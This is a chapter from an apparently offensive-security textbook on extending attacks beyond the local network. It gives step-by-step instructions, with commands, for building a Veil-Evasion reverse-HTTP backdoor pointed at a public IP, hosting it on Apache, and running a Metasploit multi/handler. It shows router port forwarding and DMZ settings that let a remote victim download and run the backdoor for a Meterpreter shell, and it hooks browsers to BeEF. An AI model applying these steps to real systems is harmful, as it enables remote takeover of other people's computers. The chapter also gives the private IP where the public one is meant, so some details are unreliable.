<html><head></head><body>
        <section>

                            <header>
                    <h1 class="header-title">Attacks Outside the Local Network</h1>
                </header>
            
            <article>
                
<p><span>This chapter mainly focuses on implementing attacks on the external network. For that, we need to know what port forwarding is, so in this chapter, we are going to get an idea of what we need to do to access the victim's machine through the router. Until now, we have been focusing on internal backdoors; now we are going to look at external backdoors. We will then look at the concept of IP forwarding, which plays another important part in attacking from outside the local network. We are also going to look at examples to gain a clear understanding of this concept, wherein we will hook our system to the external BeEF browser.</span></p>
<p class="mce-root">In this chapter, we will be covering the following topics:</p>
<ul>
<li>Port forwarding</li>
<li>External backdoors</li>
<li>IP forwarding</li>
<li>External BeEF</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Port forwarding</h1>
                </header>
            
            <article>
                
<p>So far, we have learned about a number of methods to gain full control over computers. We have seen how to do this using server-side attacks, client-side attacks, and social engineering as well. All of the attacks that we've done so far have been inside the network, and we've chosen to do that for convenience. That doesn't mean that these attacks only work inside the network; in fact, all of these attacks work outside the network as well. The only thing is that we need to configure our network in a way that allows incoming connections from the internet from outside our local network. We can use BeEF, we can use the backdoors, and we can also use server-side attacks—all the attacks that we have done so far, except for the special cases. The only thing that we want to keep in mind is that we want to configure the router to handle reverse connections properly, and direct them to the Kali machine. Now we will be focusing on that aspect and seeing how it would work and how to configure the router to achieve that.</p>
<p>Firstly, let's learn how to set up a default network. We've seen a similar diagram to the following in <a href="bc4346fc-ed68-40d5-b1c7-7f3dd0f5af76.xhtml" target="_blank">Chapter 5</a>, <em>Pre-Connection Attacks</em>, and in the following diagram, we can see that we have the <strong>ROUTER</strong>, we have the <strong>CLIENTS</strong> that are connected to the <strong>ROUTER</strong>, and then we have the <strong>ROUTER</strong> that is connected to the <strong>INTERNET</strong>:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/c345d6ca-a6d4-4cbd-995d-0fd91b25e785.png" style="width:32.58em;height:17.00em;"/></div>
<p>We mentioned before that none of the <strong>CLIENTS</strong> (all devices inside the network), don't have an internet connection; they can only access the <strong>INTERNET</strong> through the <strong>ROUTER</strong>. Whenever they want to request something, or they want to go to a website—for example, if they want to go to Google—the device would send a request to the <strong>ROUTER</strong>, then the <strong>ROUTER</strong> would go to the <strong>INTERNET</strong>, which is going to receive Google.com, and the response would be sent back to the <strong>ROUTER</strong>, then the <strong>ROUTER</strong> would forward that response to the device that requested it.</p>
<p class="mce-root"/>
<p>So, inside the network, each device has its own private IP. We can see in the preceding diagram that there are some IPs are written in red, and these only exist within the network; that's why we call them private IPs, because outside the network these IPs are not visible. Once we are in, we can see that the router has two IPs: it has a private IP in red, which is accessible by all the devices in the network and is only used inside the network; and it also has a public IP, which is in green, and is accessible through the <strong>INTERNET</strong>. The IP that is highlighted in green is the IP that Google sees. If we actually go to Google, or to any other website, they see an IP address but they won't see our private IP address; they'll actually see the IP address of the <strong>ROUTER</strong> because the <strong>ROUTER</strong> is the device that's actually making the requests, not the machine. All the requests made by these devices on the same network will all appear as if they're coming from the same machine, or from the same IP. Again, this is because the only device that has access to the <strong>INTERNET</strong> is the <strong>ROUTER</strong>; none of the other devices do.</p>
<p>In most cases, or, if we think about it, in all the attacks that we do, the main thing we want is to get a reverse connection. Even when we're using the BeEF browser, we actually get a connection on port <kbd>3000</kbd>, which is the port that the BeEF is working on, and when we're using our backdoors, we actually receive a connection on the port that we specify when we make the backdoor. When we want to send that backdoor to somewhere outside our network, the first thing we have to keep in mind is that our local IP is not going to be visible. What we have to do is use the public IP, the IP of the router. To know the router's IP, we just have to go on Google, and then type in <kbd>whats my IP</kbd> in the search bar. Google will return the IP address of the router, and that IP will be the same from all the machines in the same network.</p>
<p>Now, we are connected through a wireless card. When we launch the command, we will see that we are not using a NAT connection, we are using an external wireless card that's connected to the home network. Therefore, all the devices in our wireless network at home will have the same IP. Again, that's because they all use the same router, so they're all connected to the same network. We will be using this IP in our backdoor, we're going to send the backdoor to a person that exists on the internet, that person is going to run that backdoor, and that backdoor is going to use a reverse connection. It's then going to try to connect back to the router on port <kbd>8080</kbd>, for example, if we chose that port in the backdoor. Once the router gets a request for port <kbd>8080</kbd>, it won't know what to do with it, because the router is not listening to port <kbd>8080</kbd>, and this request will not tell the router where it wants to go. All we need to do is configure the router to tell it that we want to forward the port <kbd>8080</kbd> to the Kali machine whenever we get a request from it. We are just using <kbd>8080</kbd> as an example, but we can do it for any port that we are listening on, whether it's <kbd>8080</kbd>, <kbd>444</kbd>, or <kbd>3000</kbd> for BeEF.</p>
<p class="mce-root"/>
<p>The main idea is that we want to use our real IP outside the network. Whenever we run any attack in previous chapters and even in future chapters, if we want to run that attack on the internet, on someone who doesn't exist on our home network, then we first of all make sure we use the public IP, and also make sure we configure the router to forward requests on the port that we're listening to on the Kali machine. We're going to see how to do that in the next section of the chapter.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">External backdoors</h1>
                </header>
            
            <article>
                
<p>In this part, we are going to study how to create a backdoor. The only difference is that we're going to set the IP to the public IP instead of the local IP, and we're going to create a backdoor exactly the same way that we used to create it when we were hacking devices in the same network. For this, we are going to use <strong>Veil-Evasion</strong>, and we are going to do the same steps used in <a href="a7a11e6d-7bc7-4c55-9b61-b698d2156e37.xhtml">Chapter 12</a>, <em>Client-Side Attacks</em>. We can use the <kbd>list</kbd> command to see what options we have we are going to use number <kbd>9</kbd>, it's the exact same payload that we used in our previous example in <a href="a7a11e6d-7bc7-4c55-9b61-b698d2156e37.xhtml" target="_blank">Chapter 12</a>, <em>Client-Side Attacks</em>, the <kbd>reverse_http</kbd> payload. We're going to use command <kbd>9</kbd>, and we can see the options by using the <kbd>options</kbd> command. As shown in the following screenshot, we can see that the <kbd>LPORT</kbd> is set to <kbd>8080</kbd> by default, and we will keep that the same:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2076 image-border" src="assets/c335df0d-3152-4158-8738-b392460a1b40.png" style="width:37.17em;height:20.58em;"/></div>
<p class="mce-root"/>
<p>The only thing that we are going to change is the <kbd>LHOST</kbd>, and in the previous sections when we were receiving connections on our own computer we used to set it to the local IP <kbd>192.168.0.11</kbd>, because that's the IP that the devices use inside the network; but whenever we want to do things on the outside the network, we want to use the real IP, because these internal IPs are not visible to computers outside the network.</p>
<p>Now, we are going to use the IP that we see on Google, so when we type in <kbd>whats my IP</kbd> in Google search, we will get the IP as <kbd>89.100.145.189</kbd>; we're going to use that as the <kbd>LHOST</kbd> in our backdoor, and we are going to launch the following command:</p>
<pre><strong>set LHOST 89.100.145.189</strong></pre>
<p>Then, to make sure everything is set up properly, use the <kbd>info</kbd> command. Once we launch the <kbd>info</kbd> command, we will see that the port is <kbd>8080</kbd> and we're using the public IP <kbd>89.100.145.189</kbd>:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2077 image-border" src="assets/9d7c10a0-bd8d-4e8f-a425-ea3918189146.png" style="width:39.75em;height:17.50em;"/></p>
<p>This is the most important step, and then we're going to use the <kbd>generate</kbd> command to generate the backdoor like we did in previous chapters, and we're just going to name the backdoor <kbd>backdoor.exe</kbd>. Hit <em>Enter</em>, and that will generate our payload for us. The path of the payload can be seen in the following screenshot:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2078 image-border" src="assets/c9ef009f-1eed-40f6-9380-8d78d70e7983.png" style="width:40.75em;height:18.58em;"/></p>
<p>As usual, we are going to copy the backdoor in our Apache server <kbd>/var/www/html</kbd> directory <span>using the following command:</span></p>
<pre><strong>cp /var/lib/veil-evasion/ouput/complied/backdoor.exe /var/www/html</strong></pre>
<p>We will also see how to download this backdoor from the internet from outside the network. Now all we have to do is listen for incoming connections using the multi-handler, we've done that before again in <a href="a7a11e6d-7bc7-4c55-9b61-b698d2156e37.xhtml" target="_blank">Chapter 12</a>, <em>Client-Side Attacks</em>. While we are going to listen to the multi-handler we are going to listen on our local IP, so we are not going to listen on the external/global IP, we are going to listen on the local because we can't listen on the external, we are in the network and we only have control over current Kali machine. In the Kali machine we will be listening on port <kbd>8080</kbd>, and in the external device the backdoor will try to connect to the backdoor, the step after that will be we'll set up IP forwarding to allow router to forward port <kbd>8080</kbd> to the Kali machine. But first we need to listen on port <kbd>8080</kbd> in the Kali machine, and we're going to do that using the multi/handler using the following steps:</p>
<ol>
<li>Open Metasploit Framework using the <kbd>msfconsole</kbd> command.</li>
<li>We are going to use <kbd>exploit/multi/handler</kbd>, using the following command:</li>
</ol>
<pre style="padding-left: 60px"><strong>use <span>exploit/multi/handler</span></strong></pre>
<p class="mce-root"/>
<p class="mce-root"/>
<ol start="3">
<li>Set the payload to <kbd>windows/meterpreter/reverse_http</kbd>:</li>
</ol>
<pre style="padding-left: 60px"><strong>set PAYLOAD <span>windows/meterpreter/reverse_http</span></strong></pre>
<ol start="4">
<li>Next, we're going to set the <kbd>LPORT</kbd> to <kbd>8080</kbd>:</li>
</ol>
<pre style="padding-left: 60px"><strong>set LPORT 8080</strong></pre>
<ol start="5">
<li>Set the <kbd>LHOST</kbd>, the listening host, to our private IP. We are going to do <span>set LHOST to <kbd>192.168.0.11</kbd>. The command is as follows:</span></li>
</ol>
<pre style="padding-left: 60px"><strong><span>set LHOST 192.168.0.11</span></strong></pre>
<ol start="6">
<li>Now we are going to run <kbd>show options</kbd> to make sure everything is done properly. We can see in the following screenshot that the <kbd>LPORT</kbd> is set to <kbd>8080</kbd>, and the local host is set to <kbd><span><span>192.168.0.11</span></span></kbd>, and we're using a payload of <kbd>windows/meterpreter/reverse_http</kbd>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2082 image-border" src="assets/fbf59059-db3f-432a-aec4-41c69f6b1c07.png" style="width:39.17em;height:14.17em;"/></div>
<ol start="7">
<li>Start <kbd>handler</kbd> by running the <kbd>exploit</kbd> command. As we can see in the following screenshot, <kbd>exploit</kbd> is ready on our private IP, and it's listening for connections on port <kbd>8080</kbd>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2083 image-border" src="assets/48fb4776-9ed0-49b4-a8b6-adaade8c925b.png" style="width:32.50em;height:4.92em;"/></div>
<p>So far, we did the two main steps: we created a backdoor, and the backdoor will give us connections back based on the real IP address; and we're listening on port <kbd>8080</kbd> in our local machine, the Kali machine. When the target person executes the backdoor on the internet, the backdoor will try to connect to IP <kbd>192.168.0.11</kbd> on port <kbd>8080</kbd>. The only problem now is the gateway, which is the router; it doesn't have port <kbd>8080</kbd> open, when it receives the connection, it's not going to know what to do with it. We need to configure the router to tell it that whenever we get a connection on port <kbd>8080</kbd>, we want it to be redirected to our Kali machine. We can do that in two ways, and we're going to talk about them in the next forthcoming sections.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">IP forwarding</h1>
                </header>
            
            <article>
                
<p>Now, in this part, we'll learn how to configure the router so that it forwards incoming connections to the Kali machine. This will mean we can receive reverse connections, we can hook people to the BeEF browser, and launch attacks outside the network the same way that we used to launch them inside the network. To get to the router settings, usually the routers IP is the first IP in the subnet, our IP was <kbd>192.168.0.11</kbd>, usually, the router is the first one, so it will be <kbd>192.168.0.1</kbd>. Also, another way to get it is to type in <kbd>route -n</kbd> command, and that will show us where the gateway is. As we can see in the following screenshot, the gateway is at <kbd>192.168.0.1</kbd>. The following is the local IP address of the router:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2084 image-border" src="assets/6626e746-0230-4950-8ed0-69a6038c32cf.png" style="width:41.92em;height:5.33em;"/></div>
<p>We're going to browse <span>the IP <kbd>192.168.0.1</kbd></span> in our browser. To do so, just type the address in the address bar and hit <em>Enter</em>, and as we can see in the following screenshot, we have our router settings, and we have to log in with the username and password:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2085 image-border" src="assets/c91fb5fa-825b-4429-86b2-c40412a6b9a1.png" style="width:48.33em;height:21.92em;"/></p>
<p>Now, the router settings might look different from router to router, but the names are usually the same. First of all, we will usually have to log in, and we either have a default username and password, or we will see them on a sticker behind or underneath the router itself. Once we are logged in we can see the control panel, and again it might look different for everyone, but we want to look for something called IP forwarding. For some, it's under the <span class="packt_screen">ADVANCED</span> option. Go to <span class="packt_screen">ADVANCED</span>, and then to <span class="packt_screen">FORWARDING</span>, and as we can see in the following screenshot we can set up our IP forwarding:</p>
<div class="CDPAlignCenter CDPAlign packt_figref"><img class="aligncenter size-full wp-image-2086 image-border" src="assets/d902ea3e-f6de-4ced-99c1-b94c3cc0b28e.png" style="width:53.08em;height:21.42em;"/></div>
<div class="CDPAlignCenter CDPAlign packt_figref">Ip forwarding set up</div>
<p class="mce-root"/>
<p>Look for something called IP forwarding; we have actually seen them on some routers called <em>virtual network</em> , but we want to look for something that allows us to set up rules to redirect ports inside the network. The port that we're listening on is port <kbd>8080</kbd>, so that's the port that we picked in the handler, that's the port that we picked in the backdoor, and that's the port that we want to get the connection on. Therefore, the public port is going to be <kbd>8080</kbd>, and again the target port is <kbd>8080</kbd>, and the target IP address is the IP address that's listening on the port, so this is the IP address of the Kali machine where we have our handlers running. Therefore the IP address of our Kali machine right here is <kbd>192.168.0.11</kbd>, and we can even cross-check it from the result of the <kbd>ifconfig</kbd> command. We are going to enter the returned IP from <kbd>ifconfig</kbd> command in the <span class="packt_screen">Target IP Address</span> textbox in our router settings—that's the rule that we want to add:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2087 image-border" src="assets/768a9cbb-8cd6-475b-89f7-65d8c714fa88.png" style="width:39.25em;height:21.33em;"/></p>
<div class="CDPAlignCenter CDPAlign packt_figref">Setting up IPs and the ports </div>
<p class="CDPAlignLeft CDPAlign"><br/>
Click on <span class="packt_screen">Save</span>, and the rule will be saved, whenever the router gets a request for port <kbd>8080</kbd>, it will know that it's going to forward that request to the Kali machine and the router will not cut the connection.</p>
<p>Hence, we've set up a proper route now. The first thing we did is we created a backdoor, we used the real IP in the backdoor, we didn't use the private IP, so we didn't use the <kbd><span><span>192.168.0.11</span></span></kbd>, we used the real IP. We're going to send that backdoor to a device in a different network. That device is going to run the backdoor, the backdoor will try to connect back on the real IP to the router, but the router will know exactly what to do with this, because we just set up a rule telling the router to forward any request that it gets on port <kbd>8080</kbd> to the Kali machine. We actually want to set up a rule for port <kbd>80</kbd>; this is the port that the Apache server runs on, and we want to enable that so that we can download the backdoor from the target computer. We are going to add a rule for port <kbd>80</kbd>, and again this is going to be the same machine, the Kali machine. We're going enter port <kbd>80</kbd> and we're going to save this rule:</p>
<p class="CDPAlignCenter CDPAlign packt_figref"><img class="aligncenter size-full wp-image-2088 image-border" src="assets/967184e6-cf76-4d4c-8bca-0c529a152e2c.png" style="width:38.92em;height:21.50em;"/></p>
<div class="CDPAlignCenter CDPAlign packt_figref">Configuring the Ip table </div>
<p>This will allow us to download the backdoor because we placed the backdoor in the <kbd>/var/www/html</kbd> directory, meaning we are actually going to be able to access our web server in Kali and download the backdoor from outside the internet.</p>
<p class="mce-root"/>
<p class="mce-root"/>
<p>Now start our Apache web server and go to a Windows machine, and that Windows machine is going to be connected to a completely different network, and we're going to download the file from there. If we go and check our IP, we will see it has a different external public IP. So, we are just going to look for what our IP is on Google. The IP is <kbd>109.125.19.76</kbd>, which is completely different to the IP of the Kali machine that we used. These are two completely separate devices connected to different networks, and now we are going to access our Apache web server and download the backdoor, and normally without IP forwarding we wouldn't be able to do that. First, to access the backdoor, we are going to get the IP of the Kali machine. We called our backdoor <kbd>backdoor.exe</kbd>, therefore we are just going to open a browser on the Windows machine and, inside the URL bar, enter <kbd>192.168.0.11/backdoor.exe</kbd>. After hitting <em>Enter</em>, we will be able to download the backdoor, and this actually tells us that IP forwarding has been set up correctly, because without that, we wouldn't be able to access our web server and download the backdoor, so we are actually accessing the web server in Kali as if it's a normal website, like we can actually host fake web pages, we can host websites, anything we want right now on our Apache server.</p>
<p>Now we are going to run the backdoor on a Windows machine, and we'll see if that'll give us a reverse connection on our Kali machine, which is on a completely different network. As we can see in the following screenshot, we got a reverse Meterpreter shell, and that shell is coming from an external IP address into our internal IP address to the Kali machine, and right now we can control the target computer and do all the attacks that we did in the post-connection attacks:</p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2089 image-border" src="assets/e486f3d6-a51c-4662-a172-96354c29d152.png" style="width:42.42em;height:7.75em;"/></div>
<p class="mce-root"/>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">External BeEF</h1>
                </header>
            
            <article>
                
<p>Now lets look at another example on hooking people to the BeEF when they exist outside our network. So again, we're going to have the example against the same Windows machine that's in a completely different network, and we'll see how we can hook that machine to the BeEF. We're going to start the BeEF browser with just one click on the <span>BeEF</span> framework icon. We will go to log in with the username <kbd>beef</kbd>, and password is <kbd><span>beef</span></kbd><span> </span>as well. Now, we're going to use the same basic <kbd>hook</kbd> method that we did before in <a href="ed4df884-d2d6-4c71-a1a4-28e4a508ed19.xhtml" target="_blank">Chapter 13</a>, <em>Client-Side Attacks - Social Engineering</em>, so in that method we need to get the script code, and we did this before - it has the same procedure, and we placed the script in our Apache web server, we placed it in an HTML page, which was in the Apache web home <kbd>/var/www/html</kbd> directory. We are going to open the <kbd>index.html</kbd> file and then open the text editor, and paste the code inside <kbd>index.html</kbd>, which we got from the BeEF Terminal. The only thing that we want to change all instances where we used to use our normal IP with our external IP so that people, when they try to connect, they'll actually be able to find our computer, because if we use the internal IP they won't be able to connect. We are going to use the IP that we saw on Google when we typed in <kbd>whats my IP</kbd>, and save the file.</p>
<p>Once we have done that we need to enable port <kbd>3000</kbd>, which is the port that the BeEF works on. We need to tell the router, again in the IP forwarding settings, to forward any requests that we get on port <kbd>3000</kbd> to our Kali machine, which is at <kbd>192.168.0.11</kbd>. Now, go to the Windows machine and we're going to go to our website, which is basically the external IP of our Kali machine. This will run <kbd>index.html</kbd> automatically, and we should be hooked to the BeEF as soon as we browse to the IP. A<span>s we can see in the following screenshot, we have got a Windows machine hooked and it's using <span class="packt_screen">Firefox 5.0</span>, and now we can run all the commands that the BeEF allows us to run:</span></p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2090 image-border" src="assets/674927a4-3265-4b0d-8f06-f69cff64b04f.png" style="width:83.58em;height:20.00em;"/></div>
<p class="mce-root"/>
<p><span>Now, let's just throw an alert and see if it works. As we can see in the following screenshot, it just says <span class="packt_screen">BeEF Alert Dialog</span>:</span></p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2091 image-border" src="assets/348b1e9d-c279-43e4-a7b4-831a208fcdc4.png" style="width:26.08em;height:12.50em;"/></p>
<p><span>We're just going to execute it to make sure that everything is working properly. As we can see in the following screenshot that we are hooked to a machine that exists in a completely different network:</span></p>
<div class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2092 image-border" src="assets/eb68f1f4-ea61-457d-b8a2-c245910c8be1.png" style="width:25.17em;height:10.00em;"/></div>
<p><span>Again all we have to do is use the external IP address. Whenever we are sending it outside the network, use the IP that we see when we type in <kbd>what's our IP</kbd> on Google. When we are on our own machine, use the local IP and make sure we configure the router to redirect the port that we are listening on to the Kali machine, to the IP address, and to the private IP address of the Kali machine.</span></p>
<p class="mce-root"/>
<p class="mce-root"/>
<p><span>As an alternative to using IP forwarding, we can set the Kali machine as a DMZ host. Now, not all routers support DMZ, that's why we didn't show it from the start; but if it supports it, we can use it. What DMZ does is it's basically IP forwarding, but it forwards all ports. So, if we put the IP address of the Kali machine in here, the router is going to get a request for any port, it'll forward that request to the Kali machine, regardless of what port it is. Therefore with port forwarding, we actually select which ports we want to forward to Kali; with DMZ, it will forward all the ports to the IP that we put in here. Now and again, both of these methods can be used to allow devices on different networks to access our computer, so we can receive connections, we can allow them to access a website if we are hosting a website on our web server, we can allow them to access fake websites, and we can allow them to access the BeEF, the hook, or anything where we are listening on a port we can use this method to allow people to access it if the people exist on a completely different network than our own network.</span></p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Summary</h1>
                </header>
            
            <article>
                
<p>In this chapter, we majorly focused on how we can attack the external network and to implement this attack. We studied a few fundamentals such as port forwarding, which means redirecting the request from one port to the other. We even studied external backdoors and also how to exploit them, and we saw they are not different to internal backdoors. Then, moving ahead to another aspect of attacking the network, we learned about IP forwarding, wherein we saw how to determine the path through which the packet flows. We also implemented real-life examples to see how this works. In the next chapter, we are going to look at techniques to access the victim's system even after they are not running software on their system. </p>


            </article>

            
        </section>
    </body></html>